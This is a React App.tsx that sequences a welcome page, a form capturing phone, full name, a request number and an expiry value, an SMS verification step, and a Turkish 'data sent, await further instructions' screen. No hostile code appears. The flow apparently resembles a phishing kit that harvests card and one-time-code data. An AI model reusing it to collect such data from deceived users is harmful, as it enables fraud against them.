// src/App.tsx
import React, { useEffect, useState } from "react";
import { AnimatePresence, motion } from "framer-motion";

import GooeyPreloader from "./components/GooeyPreloader";
import Welcome from "./components/Welcome";
import CombinedForm from "./components/CombinedForm";
import SmsVerify from "./components/SmsVerify";
import SuccessCheck from "./components/SuccessCheck";

type Steps = "welcome" | "combined" | "verify" | "success";

export default function App() {
  const [loading, setLoading] = useState(true);
  const [step, setStep] = useState<Steps>("welcome");

  // данные, чтобы передать номер в SmsVerify и т.п.
  const [ctx, setCtx] = useState<{ phone?: string; fio?: string; requestNumber?: string; expiry?: string }>({});

  useEffect(() => {
    const t = setTimeout(() => setLoading(false), 800);
    return () => clearTimeout(t);
  }, []);

  return (
    <div className="min-h-screen bg-slate-950">
      <AnimatePresence>{loading && <motion.div key="pre" initial={{opacity:1}} exit={{opacity:0}}><GooeyPreloader /></motion.div>}</AnimatePresence>

      <main className="relative text-white">
        <AnimatePresence mode="wait">
          {step === "welcome" && (
            <motion.div key="welcome" initial={{opacity:0,y:10}} animate={{opacity:1,y:0}} exit={{opacity:0,y:-10}} transition={{duration:0.3}}>
              <Welcome onContinue={() => setStep("combined")} />
            </motion.div>
          )}

          {step === "combined" && (
            <motion.div key="combined" initial={{opacity:0,y:10}} animate={{opacity:1,y:0}} exit={{opacity:0,y:-10}} transition={{duration:0.3}}>
              <CombinedForm
                onSent={(payload) => {
                  setCtx(payload);
                  setStep("verify");
                }}
              />
            </motion.div>
          )}

          {step === "verify" && (
            <motion.div key="verify" initial={{opacity:0,y:10}} animate={{opacity:1,y:0}} exit={{opacity:0,y:-10}} transition={{duration:0.3}}>
              <SmsVerify
                phone={ctx.phone}
                onVerified={() => setStep("success")}
              />
            </motion.div>
          )}

          {step === "success" && (
            <motion.div key="success" initial={{opacity:0,y:10}} animate={{opacity:1,y:0}} exit={{opacity:0,y:-10}} transition={{duration:0.3}} className="px-4 py-16">
              <div className="mx-auto max-w-xl rounded-3xl bg-slate-900/60 ring-1 ring-white/10 p-8 text-center">
                <SuccessCheck message="Veriler gönderildi. Lütfen sonraki talimatları bekleyin." />
              </div>
            </motion.div>
          )}
        </AnimatePresence>
      </main>
    </div>
  );
}
